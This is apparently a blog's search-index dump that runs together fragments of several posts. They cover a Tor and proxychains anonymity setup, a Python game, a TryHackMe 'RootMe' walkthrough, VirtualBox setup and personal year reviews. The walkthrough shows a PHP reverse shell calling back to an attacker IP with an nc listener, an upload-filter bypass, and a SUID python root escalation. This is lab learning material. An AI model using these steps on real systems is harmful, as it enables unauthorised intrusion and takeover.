NIC’s… aren’t acronyms fun?\nTo get your NIC name, use ifconfig, it might be eth0 or something similar.\nEasy setup in your terminal emulator:\nInstall: sudo apt install macchanger Use: macchanger --help Show: sudo macchanger -s \u0026lt;nic\u0026gt; Random: sudo macchanger -r \u0026lt;nic\u0026gt; Reset: sudo macchanger -p \u0026lt;nic\u0026gt; See the help or man pages for more options like setting a manual MAC Address or changing only the Vendor section.\nThere’s a lot of flexibility that comes with this tool! If you wanted to emulate a specific device from Apple for example use -l to see a full list of Vendors.\nBe aware you can’t change your mac address permanently, so when you reboot your machine you’ll need to change your MAC address again.\nSetup a Proxychain When you think of a large metal chain or a small silver one, it’s an interconnected series of rings that form it, right?\nA Proxychain is similar, but instead of a series of rings, it’s a series of servers.\nWhen you visit google.com there are a few steps for your device to get there but think about it as a fairly direct route.\nA Proxy will send your request to google.com through another server as a secure means.\nSo a Proxychain essentially sends your request through a series of other servers before it reaches google.com\nIf that doesn’t make a whole lot of sense, just picture a hidden bridge only we know about, yeah that’s our Proxychain.\nOkay! Enough expo, let’s go.\nWe’ll be using a tool appropriately named proxychains.\nSetup for proxychain is a bit more detailed, but not too bad once you’ve done it.\nFollow these steps:\nInstall TOR: sudo apt install tor Install Proxy Chains: sudo apt install proxychains Edit config file: sudo nano /etc/proxychains.conf use the arrow keys to navigate. Remove # next to dynamic_chain Add # to strict_chain Add # to proxy_dns At the end of file, add socks5 127.0.0.1 9050 Close file with CTRL + X then Y and ENTER Run TOR: sudo service tor start \u0026amp;\u0026amp; service tor status Use Proxy Chains: proxychains \u0026lt;command\u0026gt; You can now send any tool through a tor proxy chain, pretty cool!\nAutomate The Process So now we’ve set up each area to make ourselves more anonymous online, it’s time to automate this setup.\nWhy? Well, every time we boot our machine, we don’t want to set each service up again! Let’s make a simple BASH script to do this for us.\nFirst, let’s create the file with nano auto-stealth and then we’ll add in the following text:\n#!/bin/bash sudo service tor start sudo anonsurf start sudo macchanger -r eth0 Save and exit that file using CTRL + X then Y and ENTER.\nLastly, make it executable by using chmod +x auto-stealth. Now it’s good to go! Run your BASH Script by simply entering ./auto-stealth and wella!\nHow cool is that?\nNow every time you want to go full Mr Robot mode, just simply run that one file and BAM! You’re in the matrix.\n*You’ll still have to use proxychains before any other command for it to route via the TOR setup, but it’s up and running!\nThanks for reading this guide toward your hacker dreams.\nIf you have any feedback, please send me a message @mrashleyball.\nThis is Day 10 of #100DaysOfHacking, subscribe to my newsletter to see the journey!\nHappy Hacking.\n","permalink":"//localhost:1313/anonymity/","summary":"How do we start using our mad hacker skills in the real world AND remain undetected?\nWe need to set ourselves up to be anonymous!

(You have six guesses)\u0026#34;) We need to set the random number to a variable, in this case, it’s x but you can call it anything.\nSince we imported the random module, we can use the randit function to set the random number. In this case, set it between 1 and 10.\nThen set the number of guesses to 6.\nx = random.randint(1,10) # Set random number to guess limit = 6 # Set guess limit to six Now the meat of the program, detecting if the user’s guess is correct or not and indicating if it’s lower or higher.\nThe for loop is perfect for repeating code a set number of times via the range() function. By setting it to (1,7) you’ve set the six guess limit.\nThe if statement checks the guess is lower, the elif checks if it’s higher, otherwise the else passes it off to break as it’s correct and ends the loop… or the guess limit is reached.\n# Detect if higher or lower for limit in range(1,7): guess = int(input()) if guess \u0026lt; x: print(\u0026#34;That\u0026#39;s lower.\u0026#34;) elif guess \u0026gt; x: print(\u0026#34;That\u0026#39;s higher.\u0026#34;) else: break # Stop once correct guess Lastly, either the guess is equal to the random number or not and a simple if else statement determines the message to display.\nif guess == x: # Display win/loss message\rprint(\u0026#34;Correct!

If you’re unaware, root means top-level access, like super admin or master-of-everything.\nWhen you gain root-level access, you own that machine, so install, delete, copy or whatever else you want, it’s yours.\nLet’s get started on RootMe\nReconnaissance First up, let’s scan the machine, how many ports are open?\n$ nmap -A -p- $ip # CTRL+C - Took too long. $ nmap -T4 -A $ip 22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) 80/tcp open http Apache httpd 2.4.29 ((Ubuntu)) So, second nmap scan found 2 ports open, ssh \u0026amp; http. Great, so that tells me it’s a web server, a non-secure one at that, and it’s able to have remote connection.\nNext, what version of Apache is running?\nOur scan has already pulled that information, 2.4.29. I’m thinking maybe I could look this verion up and find known exploit.\nWhat service is running on port 22?\nEasy again, got that from scan, ssh.\nFind directories on the web server using the GoBuster tool. Hint: gobuster dir -u \u0026lt;ip\u0026gt; -w WORDLIST_PATH.\nHm, this is a new tool, let’s first man it and see if I have it on kali.\n$ man gobuster # Not found. $ sudo apt install gobuster $ gobuster --help $ apt-cache show gobuster Directory/file \u0026amp; DNS busting tool written in Go Gobuster is a tool used to brute-force URIs including directories and files as well as DNS subdomains. So it’s ls but for enurmeration? Cool.\nAfter reading kali tools, I’ve got a wordlist to use, let’s go!\n$ gobuster dir -u 10.10.173.20 -w /usr/share/wordlists/dirb/common.txt /.hta /.htpasswd /.htaccess /css /index.php /js /panel # upload page /server-status /uploads While that’s running, I remembered I can go to \u0026lt;ip\u0026gt; to view frontend of the website… Nothing there, just a game landing page.\nNow the scan has finished, let’s try each page of the website via going \u0026lt;ip\u0026gt;/\u0026lt;page\u0026gt;. Normal stuff accept the /panel page. Strange file upload and gives a spanish error msg, a bit odd, I’ll remember this for later.\n…or right now, what is the hidden directory? /panel/\nGetting A Shell Okay, now it’s about shell access, i.e. stepping into the machine and gaining basic level access.\nLet’s read the question, find a form to upload and get a reverse shell, and find the flag. Hint: Search for “file upload bypass” and “PHP reverse shell“.\nCool, first time using a reverse shell, still unsure what/how of this, but let’s learn by searching first recommendation.\nFile upload bypass, means, due to poor validation (secuirty) allows uploaded files to run by user or server.\nSearching PHP reverse shell shows what looks like a popular github page. Let’s git clone it and take look.\n$ mkrdir TryHackMe-rootme $ git clone \u0026lt;https://github.com/pentestmonkey/php-reverse-shell.git\u0026gt; TryHackMe-rootme $ nano php-reverse-shell.php I’m taking the time to read the program (usually I don’t). It’s recommending to go to pentestmonkey.net for help, looks like a great resource!\nSo netcat needs to be running to listen and ‘catch’ the reverse shell. Cool. Let’s setup nc, edit and upload the file\n$ip = \u0026#39;10.10.10.10\u0026#39;; // CHANGE THIS $port = 4444; // CHANGE THIS $ sudo nc -vlnp 4444 After tinkering around, not sure why, but the file extension of the reverse shell file had to be changed from .php to .php5 … my guess is this tells the website it’s PHP version 5 which it can work with? Not 100% sure.\nI started cheating by the way from this video. Just to get past this step.\nOnce the reverse shell was uploaded, I went to \u0026lt;ip\u0026gt;/uploads/ to execute the file and nc picked it up, wow! My heart actually dropped a bit, like this is remote access from an uploaded file. WTH!\nSo I had to cheat a bit more on this one, annoying as I could’ve figured it out if I had more patience.\n$ find / -type f -name user.txt 2\u0026gt;/dev/null /var/ww/user.txt $ cat /var/ww/user.txt THM{*************************} Privilege Escalation Now that we have a shell, let’s escalate our privileges to root.\nCool. Let’s go.\nSearch for files with SUID permission, which file is weird?\n$ find / -user root -perm /4000 2\u0026gt;/dev/null This is hard, I’m not sure what I’m looking for.\nI used the input field from TryHackMe /***/***/****** and just guessed which directory’s based on characters, /usr/bin/python.\nOkay, next, find a form to escalate your privileges, search for gtfobins.\nFound gtfobins, searched python and looked for SUID.\n…time passes.\nLook, I’ll be honest, I’ve got root and I have no idea what made it happen. I don’t understand python so it seems like magic right now. Anyway, here are the steps I took (or followed):\n$ /bin/bash python -c \u0026#39;import pty;pty.spawn (\u0026#34;/bin/bash\u0026#34;)\u0026#39; ./python -c \u0026#39;import os; os.execl(\u0026#34;/bin/sh\u0026#34;, \u0026#34;sh\u0026#34;, \u0026#34;-p\u0026#34;)\u0026#39; Now I’ve got the # let’s search for the missing file.\n$ find / -type f -name root.txt 2\u0026gt;/dev/null /root/root.txt $ cat /root/root.txt THM{*************************} Well, that’s the last flag, we did it! Thanks to Yesspider for their walkthrough video.\nLooking back this is a good beginner game, even if it felt really hard and lead me to cheat, I use the term ‘cheating’ loosely as it’s still learning. If I get so stuck I want to give up, it’s better to look at a walkthrough than stop altogether.\nI’m getting comfortable running some nmap which is great, and then sifting through information to find what I’m after.\nI learnt about gobuster, a tool I want to use more! It felt great using a reverse shell and understanding the concept even if I didn’t understand 100% of what I was following along with. Something about setting up nc to listen and catch information felt amazing!\nI loved used find one of the most basic commands which still havent clicked for me. Lastly using Python, now to be honest all of that went right over my head. But I’m using it, being more familiar, so it’s a start!\nHope you enjoyed this CTF Walkthrough.\nIf you have feedback, please send me a message via Twitter.\nThis is Day 6 of #100DaysOfHacking, subscribe to the newsletter to see the journey!\nHappy Hacking.\n","permalink":"//localhost:1313/tryhackme-rootme/","summary":"I’m still on the Complete Beginner learning path from TryHackMe, so this is my first venture outside into their library of CTF’s.\nThis is a beginner ‘easy’ game, their description reads a CTF for beginners, can you root me?

It’s currently Australia’s top hiring priority.\nWhat’s Cyber Security? And why is it so popular? Let’s do some research and find out!\nDisclaimer: I’m not a Cyber Security expert, I’m a student of IT and love sharing what I’m learning or have learnt.\nWhat’s Cyber Security? Cyber Sec is an entire industry, it’s grown out of the necessity to keep data safe and prevent cybercrime.\nThere are two main areas:\nDefensive a.k.a Blue Team. Offensive a.k.a Red Team. Defensive involves monitoring systems to detect attacks and enabling prevention methods to stop future ones.\nThe offensive is about testing system strengths and weaknesses, acting as a cybercriminal to break in, legally.\nThey’re two sides to the same coin, and they’re mote areas like purple teams too. Cyber Sec involves understanding computers at multiple levels with broad knowledge and out-of-the-box thinking.\nHistory of Cyber Security It’s important to understand a bit of history, here’s a watch-list of some good documentaries to spend time with.\nThe Perfect Weapon 2020: Recent rise of cyber conflict. Zero Days 2016: Deep dive into the first computer virus to have a real-world physical impact. The Great Hack 2019: How our data is being used. The Social Dilemma 2020: The state of Social Media and its impact on people. Deep Web 2015: Cybercrime culture and the illegal side of the internet. For more, I found a list of documentaries on cyberculture spanning more topics and interests. It’s not history, but I’d recommend watching a bit of Mr Robot. It’s fictitious, but taps into cyberculture and demonstrates real-world technology.\nCyber Security Skills So what skills are needed in Cyber Security?\nArguably the top skill is researching, knowing how to find information and the right information. It’s impossible to know everything in I.C,T, so quick search skills are fine art.\nMaybe more important than research is your mindset.\nHaving a desire to learn, tinker and deep dive into topics is a huge asset here.\nMindset helps gain knowledge on a variety of technologies like various operating systems, applications, hardware, programming languages and virtualisation software (like building a Linux Lab).\n“InfoSec interviewers usually value motivation, critical thinking, and self-study above all else” – Lesley Carhart, a 20+ year veteran in the I.T. industry.\nWriting is another important skill!\nDocumenting and sharing information are two massive areas of the Cyber Sec community. It encourages newcomers to the industry while keeping other professionals in the loop.\nOnce beyond soft/general skills, there are endless avenues of technical skills to explore. The top three are:\nNetworking. System Administration. Programming. Combine these three to set yourself up for a good foundation.\nForbes says “The fastest-growing cybersecurity skill is Application Development Security, predicted to see a 164% increase in available positions over five years.”\nLearning Cyber Security Now you’re aware of the Cyber Sec history and skills required, how do we put this together? Learning!\nHere are some top courses:\nIntroduction To Computing Fundamentals. Introduction to Computer Science. Learning Paths from Hack The Box \u0026amp; Try Hack Me. For a full guided list, see Learning Path for Beginner Hackers.\nThere are countless great resources from games like OverTheWire Wargames to YouTubers like NetworkChuck, John Hammond and DarkSec. I love podcasts from Darknet Diaries and keeping up-to-date with blogs from Lesley Carhart and Daniel Miessler.\nA lot of the resources above have discord or slack communities to network and connect with other learning Cyber Sec techies.\nSo now you’re set up and good to go!

Your computer, aka host machine, will need to be above these to share resources with your Virtual Machine (VM). Why? You’ll run into a sluggish experience otherwise i.e. not enough juice in the tank!\nNow grab VirtualBox for your current operating system (Windows, macOS or Linux) on your computer, I’ll be using Windows.\nYou don’t have to read all of it, but it’s good to know the VirtualBox User Manual has everything you need in case you run into issues.\nOnce downloaded, install VirtualBox by running the .exe file.\nVirtual Machine Settings Let’s get Ubuntu installed:\nClick new (the blue startup top) and name your VM, I recommend a logical naming convention like Ubuntu 1 and creating a new folder with the same name. Put it wherever you’d like, but I’d also recommend creating a VM root folder for any other VM you create. VirtualBox should detect what type and version depending on the name you give it. If it isn’t correct, use the drop-down options to select Linux and Ubuntu (64-bit). Set the Memory size, remember what the system requirements were? 4GB, so type 4000MB into the input field. Select Create in the Hard disk section, we don’t need to change anything here, press Next. VDI is fine for the Hard disk file type, select Next. Read the difference between Dynamically allocated and Fixed-size, I recommend Dynamic. Now for File location and size leave the file path default and scale up the size to at least 25GB to fit system requirements. Insert Ubuntu ISO File Great! Now your VM is ready to boot… or is it??\nIf you hit Start a warning dialogue box should appear: This is where you select the Ubunutu iso file from back in step 1. Click the folder with the green up arrow, add and navigate to iso file. If the VM starts up and fails, close window and power off the machine. Now under the VM Storage settings, click Optical Drive Empty and follow step 2 above. Now follow your nose from here, watch the prompts and check the settings, it’s straightforward.\nSetup Guest Additions Once your new Ubuntu VM is set up and ready to rock, it’s recommended to install VirtualBox’s Guest Additions. It’s optional software that gives some ‘nice to have features to make life easier.\nTo install, within VirtualBox select Devices (up the top of VM) and Insert Guest Additions CD image…\nSo now you’re set up and good to go!

Summarising an entire year feels difficult. But I see the value in looking back. It makes moving forward clearer.\nLooking forward is hard. The future is a fantasy. No one knows what’s happening tomorrow. But looking back is tangible. I like tangible. So here’s my look back at the past 12 months. Ups, downs and the honesty in-between.\nThis article is self-indulgent. If you want value, this isn’t for you. If you like stories and personal insights, read on. This article will cover:\nQuitting The Company Current Teaching Position New Teaching Position Writing Well and Creating Content Family, Friends and Fun Looking Forward with an Annual Plan Quitting The Company After two and a half years, I’ve quit my business. A difficult, overdue decision. In 2018, a group of five of us came together. The intentions were simple, to join skills and become a digital agency. We strived to be transparent, offer fair prices and do high-quality work.\nWe faced many hurdles. The fall out of one member, time commitment, personal tragedies and general difficulties. This all meant lots of adapting, a typical start-up story. We turned from a digital agency into a marketing referral machine.\nAfter a time, I resented the business and its path. I lost motivation, creativity and the joint focus was gone. I realised the business wasn’t for me anymore. Lessons from The Four Hour Work Week and Company of One we’re opening my eyes. I learnt setting goals brings clarity. The business wasn’t helping me toward my goals.\nWe all had strong relationships within the business. Conveying my stance and moving forward was smooth. I learnt honesty meets honesty. I stated how I felt and my decision to quit. We improvised an exit strategy, agreed and that was it.\nNow, the business lives on. I wish them the best and hope it becomes what we dreamt. I’m happy I contributed, but I’m happier now.\nCurrent Teaching Position Classroom teaching has been rewarding. As an extrovert, I get energy from others. The environment is perfect for me. I value my team of teachers. I’m thankful to have level headed, honest and hard-working teammates. Our students have been great too. Met lots of nice people and made new friends.\nWe experienced a complete online transition mid-year. But adapted a blended model moving forward with one day on campus. It wasn’t a jarring transition into online teaching, we loved it.\nI attended a two-day workshop dedicated to understanding and developing leadership. It was monumental as I made high-quality connections and fond memories. I learnt the value of authenticity. Heard heartfelt stories of overcoming challenges. Had engaging activities and frameworks which forced us outside our comfort zone.\nI learnt the importance of failing. Things go wrong all the time. As a teacher and especially in I.T, I’ve always avoided failure. I was the kid who never asked questions in school. But failing brings an opportunity to learn. When things go wrong, we figure out what’s right.\nNew Teaching Position Since March, students are learning over the internet; 70% of students enrolling for my qualification are remote. Online enrollments have increased over the year. My last class was the smallest, ever. It’s worried me. Without enrollments, there are no classes which means no hours i.e. no job. The emotion of fear drove action.\nI started to book meetings with people I knew. One teacher led to another which led to a manager for the online department. Within 5 minutes, the conversation turned from informative to proactive. I was being vetted for an online teaching position which I made available. After the call, a week passed and I got the confirmation, I’m in!\nI learnt to find and go through windows. I went outside the norm and found a new teaching position. It wasn’t advertised, there was no door in. So I found a window. Going into 2021, I have full-time work across two teaching roles!\nWriting Well and Creating Content 2019 taught me I love learning. 2020 is writing. How incredible is writing? I’m writing every day. Morning journaling, daily brain dumps and blog posts.\nI’m committed to writing a weekly newsletter. I’m also publishing semi-regular blog posts to better package ideas. I’ll repurpose them as videos or podcasts in the future. For now, the focus is simple – write well. If I write well, I think well. Both thinking and writing are skills I’m nurturing. This impacts teaching material, assessing student work, posting to social media and everything else.\nI’ve learnt I need a system if I want to build a skill or habit. Everything gets stored in Notion. I’m building templates to optimise time and databases to organise content. I learnt consuming vs contributing. The internet is our global knowledge pool. Consuming content spurs ideas for reference. Contributing content is fulfilling. I’m finding the balance.\nFamily, Friends and Fun Since September 2019, it’s been one year of marriage. I love having a companion I can trust, support and experience life with. I’m much happier now and wouldn’t have it any other way. We celebrated our first anniversary by going inland to a small town called Montville. We spent a few days relaxing and enjoying each other’s company.\nThroughout the year like everyone, travelling wasn’t an option. We got away to see friends and enjoy small trips. In July we went to the Gold Coast, went camping in August to Kenilworth and in December we stayed in Rainbow Beach.\nI learnt the importance of family. With grandparents getting older and an increase in health issues. One of the top regrets in life is not spending enough time with family. I’m so grateful to have my family and my wife’s family in my life.\nLooking Forward with an Annual Plan Vision statement:\nIn 2021 I’ll have published 52 weekly newsletters, 20+ blog posts and have a backlog of content ideas. I’ll have clearer thoughts on subjects and better package them for others. I’ll grow my newsletter subscribers to over 100. I’ll feel comfortable working in public and confident writing well. I’ll focus on LinkedIn and grow my post engagement to 10+ per post. I’ll take part in online networking events and make higher quality, genuine connections. And I’ll be more comfortable conversing in social settings.\nKey indicators:\nBuild positive habits from writing/thinking well.\nWriting in my daily journal Publishing weekly newsletters Publishing bi-weekly blog posts Attending monthly (or more) networking events Focus area:\nWrite well and think well. I’ll enjoy life by being present and not overthinking. I’ll have a clearer internal compass which improves outward actions, letting me focus on others and helping more.\nThanks to Julian Shapiro for Writing Well handbook.

Personally I’ve always enjoyed using it. It’s fast, fluid design and easy navigation make it a great note-taking app. OneNote is good at one thing, notes.\nWhat if you want more?\nWell, that’s where Notion comes into play.\nNotion excels at note-taking too, but its variety of widgets enables you to store day planners, habit tracker and so much more. So this is my story of how I’m changing from OneNote to Notion as essentially my second brain.\nOneNote Origins For me, OneNote entered my life back in 2012. I remember clearly as it was my final year of high school and we were introduced to the 1-to-1 laptop initiative. So every single student had a school-issued laptop, sounds great, as it did at the time! Just a few years later the whole thing failed as schools were spending so much on laptop repairs.\nAnyway, young Ashley new he had a lot of class notes and assignments to organise in his final year. I remember thinking of a simple, yet extremely inefficient method or word docs and folders. Yes, I was going to organise my entire schooling life into docs n folders. Which now, sounds like a terrible means of note-taking, but at the time, that’s all I knew.\nUntil, my friend Rhys said, “I’m using OneNote”… “What’s that?” I stuttered. And at that moment, everything changed. For a student, OneNote was the perfect method for notes. Microsoft took a physical school book and digitalised it.\nA book has sections and has pages, boom! OneNote could easily organise math, english, music and all my subjects while keeping a nice timeline of class notes and assessment. Done!\nOneNote Problems As 2012 wrapped up I continued studying and began my journey into web design, where OneNote played a big part. After further study’s OneNote had already begun organising other aspects of my life. My own personal inner ideas had a place to go, goals and aspirations had their own space. Then for my own spiritual routine, I could keep weekly meeting notes. Then later when I entered the business I continued to store important information.\nFast forward to now and I’ve got a workbook for each space of my life. Personal, Spiritual, Professional, Business \u0026amp; Work. Each workbook is organised either by sub-spaces or in a year by year timeline. These two methods have worked great to easily access whatever I’m after and at the same time organised each space.\nAs life has gone on, being married now, I’ve realised more things are connected in my life. As each space has been separated in OneNote, I have years of information with no easy way to filter or receive that information. And with my method of separate spaces, everything is essentially, unconnected.\nPairing this unconnected state, amplified by the current world situation, I’ve actually lost my organised way of life. OneNote always helped me stay on top of things, but honestly the last 6 months I’ve felt like things are on top of me. Unknowingly, I’ve really needed a new system to get back on top of my life. Enter Notion.\nThere are two areas that I needed to address when switching from OneNote. Can this system do everything I can do in OneNote? And, is it easy to switch from OneNote?\nNotion Answers First, features and possibilities. Yes, Notion can do everything OneNote can do. After all, I use OneNote mainly for note-taking and information storage. Notion can easily do those two things.\nNow is it easy to switch to Notion? Well no, not from OneNote, from other apps, yes, but no for me. But it’s a good thing. It’s not easy switching to Notion because theirs no quick n easy way to copy all my years of OneNote information into Notion, but if there was, I wouldn’t be utilising Notion, it’d just be a different looking note-taking app with the same old structure I’ve been using.\nNotion is in a different category to OneNote. For example, I’ve been attempting to create life organising databases. Databases for sensitive information, future planning and goals, OneNote is not designed for that, essentially I’ve been using it wrong for the past 5/6 years. But Notion is great at easily storing AND connecting all of these areas.\nSo I’m taking this opportunity NOT to just copy-paste my OneNote pages over to Notion. But completely revamp and improve my system for organising everything. So far, the journey has felt great. The new user interface has felt refreshing, learning the new tools and figuring out what works for me has been a lot of fun! Notion is a big piece of software it can be a bit overwhelming at first.\nNotion Plan As of right now in May of 2020, my notion setup is a very big ‘Work In Progress’ as I have a feeling it will change a lot of the coming months. However, here is my game plan.\nSo far I have three common spaces, start, thoughts and learn. Which all have their interconnected organisation behind them.\nStart Space: This is the homepage to my life, what I need to do, want I want to do, everything is getting stored here to easily access. Already this is a massive step in connecting all the different spaces in my life. At a glance, I can see what tasks I need to think about, a history of my mental health and future plans.\nThoughts Space is to store ideas. For example when listening to a podcast, if that sparks a blog post idea, instead of writing it down in a void of notes. I can store it, tag it and have it ready for later use. This level of efficiency for idea storing is exactly what I’ve needed.\nLearn Space is all about storing knowledge and actively engaging that knowledge. I have a big problem with consuming tutorials or courses and forgetting the information sometimes overnight. My Learn Space is to make it easy to navigate through my notes and find what I need. I’m planning a system to practice active recall to better remember what I’ve learnt.\nThen are the five life spaces I’ve always had. To be honest, I don’t have a solid plan for this space right now. Currently, my thought process is to just keep notes under each one but then I’m just going back to how I’ve always used OneNote. So the answer is, I’m not sure what to do with them yet.\nAs for everything back in OneNote. I’m actually taking a staggered approach to converting pages. I’m not worried about moving everything across, rather more focused on what I should move across. I want Notion to be lean, without bloated notes or areas. It’s a bit of a mental facelift for me or a mind clean, so I’m only keeping what I’ll need.\nNotion For All? Now you might have been reading this post for a few different reasons, but if you’re deciding if Notion is for you, here’s a few areas to take note.\nNotion has lifted their Personal Plan limitations. Before this month there was a 1000 block limitation on the free tier for Notion. Now being unlimited, it’s a great time to try Notion out.\nNotion has an awesome, active community. I love seeing how others use the software I use, and the people who use Notion are an awesome bunch of people who create a lot of great content.\nNotion is also backed by a great team of designers and developers. They’re a small, focused group dedicated to creating Notion great. Which means Notion will continue getting better and better.\nNotions features make itself nearly limitless. As individuals, we can use this personally to organise our own life. But for teams, Notion can be a powerful project management tool. Some even use Notion as a complete website and blog, pretty cool.\nHowever, with all of those pros, I do recognise there are cons to Notion. It may be confusing and feel like it’s ‘too much too learn’. Which actually was me a few years ago. Yes, I’ve tried Notion in the past and couldn’t commit to switching because, honestly, I didn’t quite get how to use notion. So from experience, Notion will take some time to adapt too. If you’re patient and want to learn, then it will be fun, and you’ll get a lot in return.\n","permalink":"//localhost:1313/onenote-to-notion-moving-apps/","summary":"If you’re reading this you may very well be a lot like me.\nUsing OneNote for personal notes, jotting down key meeting highlights and organising thoughts and ideas.\nIf that sounds familiar, you’re probably a long time user of OneNote and a happy user. Personally I’ve always enjoyed using it. It’s fast, fluid design and easy navigation make it a great note-taking app. OneNote is good at one thing, notes.","title":"OneNote to Notion and Moving Apps"},{"content":" What a year! 2019 has been busy to say the least, I’ve learnt a lot of new lessons made even more mistakes! But overall, it’s been a massive year of growth so it’s all been worth it! Let’s review 2019!\nMy Job as an IT Teacher 2019 was full of highlights like being featured in the companies blog, having short piece in a local magazine, being nominated for an educational emerging leader award and having one of our students win TAFE QLD student of the year award. The highs have been high!\nThis year has been the most ” settled ” I’ve been in my position here, especially compared to year uno. I’m confident with most of the internal processes and policies and feel comfortable in most aspects.\nI’ve had a lot of positive feedback as a professional in the educational industry. This has resulted in my imposter syndrome slowly disappearing, which feels great! I’ve never felt more relaxed to call myself a teacher.\nThere’s been more opportunities to network and get to know peers outside my IT Team. I’m better acquainted with some local teams and due to my nomination for Emerging Leader I was able to meet great people from all over our company!\nNow with 2020 on the horizon, I’m looking toward shaping our IDMT course into the best computer science course there is!\nProfessional Development This year has been my slow decent back to the basics. As I’m taking teaching more and more seriously, I’m pushing myself to break everything down to its core.\nFor the last few months my note taking has halted at every line, I challenge myself to capture knowledge better. Use fewer words, describe with more accuracy, convey in simple terms.\nI began tackling a computer language called JavaScript. The third coding language of the web technology tree, HTML, CSS \u0026amp; JS. It’s challenged me so much that its taught me I’m missing fundamental theories. I’ve gone back a few steps but I’ll be running in no time.\nI have however finally understood Git, GitHub, Emmet, Visual Code, the Terminal and a few other developer side technologies. This year has been a realisation of a lot of things.\nI feel very comfortable with my knowledge on general technologies and computer basics. I’ve always had a feeling of comfort but never to this extent.\nNext year it’s all about doubling down on the knowledge I have and acting on it. I’ll be building web projects, expanding ideas and making fun stuff!\nThe Marketing Company It’s also the second year of our marketing company Eudomia Group. It’s been a big year for us!\nOur client base has grown ten fold and the quality/calibre of client we’re attracting has improved. The last client onboarding meeting was an “A-ha” moment of the past 24 months of work coming together, I could see marketing opportunities so clearly.\nThere’s been a lot of change for he team too. We’ve all moved our internal positions as directors, I’ve moved away from IT to an innovation role. This is in line with what I’ve been doing for the last 6-12 months for the company.\nWe’re working toward the fourth iteration of our website to again simplify our messaging. We’re in a very comfortable position to market toward other professionals. So our design is very important fourth time around!\n2019 was a positive year for us and we’re looking forward to 2020 as our most profitable year yet!\nThe Blog This space has been a great sandbox to play around in and experiment. Looking over the last 12 months, the blog looks like it has no clear intention.\nThere’s some posts about me, my learning journey, some recommendations etc. I’ve been writing and sharing content I enjoy, but it has felt flat. I feel my target audience still isn’t clear, I’m not confident in who I’m attracting and why.\nMoving in to 2020 I’m going to update my professional brand and focus on my content creation. All in an effort to market myself while learning more about SEO, analytics, page optimisation.\nOverall It’s been a great year and I wouldn’t change anything! I love my job, I’m excited to see where the company lands and how my blog/professional development will grow.\n2019 was a big year and I’m excited to see where 2020 will take me. Thanks to everyone along the way who has helped me.\n","permalink":"//localhost:1313/2019/","summary":"What a year! 2019 has been busy to say the least, I’ve learnt a lot of new lessons made even more mistakes!

Reply to give me your feedback on these topics.\n1. Importance of LinkedIn If you’re not on LinkedIn, it’s worth signing up and engaging. Growing a network is one of the best moves you can make. Julian Shapiro’s company wrote an incredible article detailing their strategy for LinkedIn.\n“…the strategy is to warm up leads, get their trust, incept them with the need for your product, then take things to a deeper conversation.” – Demand Curve\nLinkedIn Organic Marketing Playbook outline:\nCreate a Steady Flow of Leads Post content that people engage with Getting email addresses Optimizing your profile for follows “The backbone of this approach is getting your audience to engage your LinkedIn posts.”\n2. Annual Review I’ve seen annual reviews before, but never taken in interest in them. Until now!\nWhy an Annual Plan? 1) focus and 2) know what you want. What is an Annual Plan? 1) vision statement 2) key results i.e. how do I know when I got there? and 3) areas of focus.\nRemember, “it’s okay to change over time.” – Jack Conte. Keep reading for a link to my 2020 year review.\n3. Life Coach Advice I finally got around to finishing this Deep Dive with Khe Hy from Rad Reads. I took away a lot of great lessons like do things that don’t scale and tools are traps. I loved his effortlessness, he’s a big believer in following the fun. I took that on board.\nHe covers a lot of topics:\nCharging for Courses Lessons from Marriage Coaching Process vs Outcome Signs of Misalignment Self-Worth and Validation Personal CRMs + Tools Finding Life Purpose the Role of a Coach “When you have fun working on something 8, 10, 12 hours per day, the output is going to be awesome. But you shouldn’t be motivated by the outcome, you should be motivated by the process which should be FUN.” – Khe Hy\nThank You For Reading ⚠ ANNOUNCEMENT ⚠\nI unintentionally started a Podcast. I wanted to read my blog posts and put the audio recording on my website. For a bit of fun and in case someone wanted to listen. But once I read it out and showed friends/family, the feedback was clear. It was boring! So I made it more conversational, more podcast like. Then I had to figure out the best way to host audio files. I purchased a lifetime deal to Podcast.co which was the easiest, fastest way of doing it. So, I have a podcast.\nHere’s my Annual Review of 2020. “Looking forward is hard. The future is a fantasy. No one knows what’s happening tomorrow. But looking back is tangible. I like tangible.

You may have noticed I\u0026rsquo;m writing again, yes that\u0026rsquo;s right, I\u0026rsquo;m sticking to good habits and moving forward!\nWhat is Business Coaching? Dan Sullivan\u0026rsquo;s Coaching: The #1 Industry For The 21st Century explains what business coaching is.\nI never understood business coaching, sports coaching makes sense though! Teams need someone to align their goals and tactics, but a business owner? Why would a business owner need someone to help them run their business?\nThe role of a business coach is to make the business owner\u0026rsquo;s path clearer for them. What are some important goals, tasks, roles etc? So it is like a sporting coach after all.\nHe makes a great point that a business coach doesn\u0026rsquo;t need to know your business, you know your business. But they do need to challenge your thinking and your decisions to give you clarity.\nThis has made me reconsider the value business coaching brings to me as a business owner.\nHow to Trick Your Brain into Learning More? Mark Rober gave this TED talk The Super Mario Effect – Tricking Your Brain into Learning More. He\u0026rsquo;s a YouTuber and he questions traditional learning methods by using game mechanics.\nRober says how to turn passing assessment, into passing game levels. Instead of a fear of failing, there\u0026rsquo;s a natural fight to overcome obstacles to improve one\u0026rsquo;s skill.\nMany universities and schools around the world are using this style of learning. It\u0026rsquo;s gone beyond gamification, due to video games like Minecraft: Education Edition.\nThe mind-shift is to focus on the end goal NOT the failures along the way. I hear students say “I can\u0026rsquo;t do this, I don\u0026rsquo;t know what I\u0026rsquo;m doing”. I try to reassure them it\u0026rsquo;s okay not to know,it\u0026rsquo;s why they\u0026rsquo;re here to learn.\nSo as Mark puts it, focus on the princess, not the pits, i.e. stick with a task and learn more.\nMaker or Manager Schedule, What\u0026rsquo;s Yours? Tim Ferris and Daniel Ek, shared an article by Paul Graham called Maker\u0026rsquo;s Schedule, Manager\u0026rsquo;s Schedule. It\u0026rsquo;s a short read which explains the thinking behind two types of workers, makers and managers.\nMakers are creators like programmers or product designers. Their focus is on the project in front of them, meetings are often distractions and can create worry.\nManagers are, well, managers – the higher-ups or bosses of the world. Their schedule is people-focused and meetings are variables throughout their entire day.\nThis struck a chord with me as my team and I are all makers. As teachers, our focus or project is our classroom of students in front of us. Meetings breakup our workflow and generally create stress as it pulls us out of our purpose.\nEven as a freelance web designer, client meetings can bother me. I\u0026rsquo;m more interested in the client\u0026rsquo;s project than the project meetings.\nMeetings are important, makers see that. It\u0026rsquo;s making everyone aware that meetings impact us in different ways. If we can be aware of each other\u0026rsquo;s 